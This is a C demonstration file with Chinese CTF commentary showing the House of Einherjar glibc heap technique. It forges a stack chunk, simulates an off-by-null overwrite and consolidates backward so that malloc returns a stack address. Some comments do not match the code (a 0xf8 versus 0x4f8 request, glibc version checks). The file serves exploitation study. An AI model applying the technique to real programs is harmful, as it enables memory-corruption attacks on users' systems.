/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_einherjar
 * 文件标注范围：2.26 ~ 2.29
 * 模拟漏洞：off-by-null/off-by-one 清除 PREV_INUSE，且可伪造 prev_size 与前块双向链。
 * 核心流程：让 free 误认为前方存在 fake free chunk，后向合并出覆盖活动 chunk 的大块，再借 tcache poisoning 定位目标。
 * 成功判据：重分配得到重叠或目标地址。2.29 起 prev_size 必须与前块 size 相等，2.32 起 poisoning 需安全链接。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

/*
 * 感谢 st4g3r 公开 House of Einherjar。它利用 off-by-one null 覆盖下一块
 * size 的 PREV_INUSE 位，再伪造 prev_size 与前方 free chunk，使 free
 * 错误地向后合并到攻击者选定地址。相比普通 Poison Null Byte，它能直接
 * 构造更强的重叠/任意起点分配，但额外要求堆地址泄漏来计算 fake prev_size。
 */

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	a = (uint8_t*) malloc(0x38);

	int real_a_size = malloc_usable_size(a);

	// 在已知地址构造 fake free chunk；本低版本示例放在栈上，便于直接观察返回地址。

	size_t fake_chunk[6];

	fake_chunk[0] = 0x100; // 2.26 起该 prev_size 必须与 fake_chunk->size 一致，才能通过新增检查。
	fake_chunk[1] = 0x100; // 先给出一致的小尺寸位型；实际利用前会覆盖为两地址间的真实距离。
	fake_chunk[2] = (size_t) fake_chunk; // fd 回指自身，满足 unlink 的 FD->bk == P。
	fake_chunk[3] = (size_t) fake_chunk; // bk 回指自身，满足 unlink 的 BK->fd == P。
	fake_chunk[4] = (size_t) fake_chunk; // fd_nextsize 自环，避免大块附加链检查访问未知地址。
	fake_chunk[5] = (size_t) fake_chunk; // bk_nextsize 同样自环，使 fake chunk 结构完整可解引用。

	/*
	 * 选择请求 0xf8，使对齐后的物理 size 为 0x100、带 PREV_INUSE 时为 0x101。
	 * 最低有效尺寸字节本来就是 0x00，off-by-null 只会清除标志位，不会意外
	 * 缩小 chunk；若低字节还含尺寸，必须在缩小后的边界另行伪造 next chunk。
	 */
	b = (uint8_t*) malloc(0x4f8);
	int real_b_size = malloc_usable_size(b);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
	/* 漏洞效果是覆盖下一块 size 的最低字节，重点在清除 PREV_INUSE。 */

	/* 漏洞模拟开始/结束 */
	a[real_a_size] = 0; 
	/* 漏洞模拟开始/结束 */

	// 在 a 末尾可控机器字伪造 b->prev_size，使 b 向后跳到 fake_chunk。

	size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);

	*(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;

	// fake_chunk->size 要与 b->prev_size 相等，满足后续 size(P)==prev_size(next_chunk(P)) 检查。
	fake_chunk[1] = fake_size;

	// 释放 b；PREV_INUSE 已清零，_int_free 会把它与前方 fake_chunk 向后合并。
	free(b);

	// 如果 b 后面还有已分配 chunk，fake_chunk + fake_size 必须落到攻击者
	// 可写位置，并在那里伪造 next_chunk->prev_size == fake_size，才能通过
	// size(P) == prev_size(next_chunk(P))。本例让合并结果邻接 wilderness，
	// 所以不需要额外的尾部边界伪造。

	d = malloc(0x200);

	assert((long)d == (long)&fake_chunk[2]);
}
